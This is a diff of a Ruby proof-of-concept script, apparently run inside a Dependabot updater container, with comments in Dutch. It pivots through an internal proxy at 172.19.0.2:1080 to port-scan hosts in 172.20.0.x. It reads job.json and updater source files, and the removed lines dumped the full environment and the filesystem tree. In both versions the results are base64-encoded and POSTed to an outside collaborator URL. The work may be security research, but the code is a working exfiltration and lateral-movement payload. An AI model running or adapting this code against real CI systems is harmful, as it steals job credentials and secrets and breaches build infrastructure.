@@ -8,56 +8,44 @@ begin
 
   results = []
 
-  # DNS resolve + direct IP access
-  begin
-    require "resolv"
-    ip = Resolv.getaddress("dependabot-actions.githubapp.com")
-    results << "=== API IP: #{ip} ==="
-    Timeout.timeout(3) do
-      s = TCPSocket.new(ip, 443)
-      s.close
-      results << "=== DIRECT #{ip}:443 OPEN ==="
-    end
-  rescue => e
-    results << "=== RESOLVE/DIRECT: #{e.class}: #{e.message} ==="
-  end
-
-  # Proxy pivot met strikte 3s timeout
-  ["http://172.17.0.1/", "http://172.18.0.1/", "http://172.20.0.1/", "http://172.16.0.1/"].each do |target|
-    begin
-      Timeout.timeout(3) do
-        sock = TCPSocket.new("172.19.0.2", 1080)
-        host = URI(target).host
-        sock.write("GET #{target} HTTP/1.0\r\nHost: #{host}\r\n\r\n")
-        resp = sock.recv(1024)
-        sock.close
-        results << "=== PIVOT #{target} ===\n#{resp[0..300]}"
+  # Scan 172.20.0.x via proxy op meerdere poorten
+  # Proxy heeft routing naar dit subnet, updater niet
+  [1, 2, 3, 4, 5].each do |host_id|
+    [22, 80, 443, 2375, 8080, 8443, 9090].each do |port|
+      begin
+        Timeout.timeout(4) do
+          sock = TCPSocket.new("172.19.0.2", 1080)
+          target = "http://172.20.0.#{host_id}:#{port}/"
+          sock.write("GET #{target} HTTP/1.0\r\nHost: 172.20.0.#{host_id}\r\n\r\n")
+          resp = sock.recv(512)
+          sock.close
+          results << "=== PIVOT 172.20.0.#{host_id}:#{port} ===\n#{resp[0..200]}"
+        end
+      rescue Timeout::Error
+        results << "=== 172.20.0.#{host_id}:#{port} TIMEOUT ==="
+      rescue => e
+        results << "=== 172.20.0.#{host_id}:#{port} #{e.class} ==="
       end
-    rescue Timeout::Error
-      results << "=== PIVOT #{target} TIMEOUT ==="
-    rescue => e
-      results << "=== PIVOT #{target} #{e.class} ==="
     end
   end
 
-  # /home/dependabot filesystem tree
-  begin
-    tree = `find /home/dependabot -maxdepth 5 -not -path "*/vendor/*" 2>/dev/null`
-    results << "=== FS TREE ===\n#{tree[0..5000]}"
-  rescue => e
-    results << "=== FS TREE ERR: #{e.class} ==="
-  end
-
-  # Volledige env
-  begin
-    env_dump = ENV.map { |k, v| "#{k}=#{v}" }.join("\n")
-    results << "=== ENV ===\n#{env_dump}"
-  rescue => e
-    results << "=== ENV ERR ==="
+  # Kritieke bestanden lezen
+  [
+    "/home/dependabot/dependabot-updater/lib/dependabot/environment.rb",
+    "/home/dependabot/dependabot-updater/lib/dependabot/api_client.rb",
+    "/home/dependabot/dependabot-updater/output/summary.md",
+    "/home/dependabot/dependabot-updater/job.json",
+  ].each do |path|
+    begin
+      content = File.read(path)
+      results << "=== #{path} ===\n#{content[0..3000]}"
+    rescue => e
+      results << "=== #{path} ERR: #{e.class} ==="
+    end
   end
 
   payload = [results.join("\n\n")].pack("m0")
-  post_uri = URI("#{COLLAB_URL}?poc=pivot3")
+  post_uri = URI("#{COLLAB_URL}?poc=pivot172_20")
   r = Net::HTTP::Post.new(post_uri)
   r.body = payload
   Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
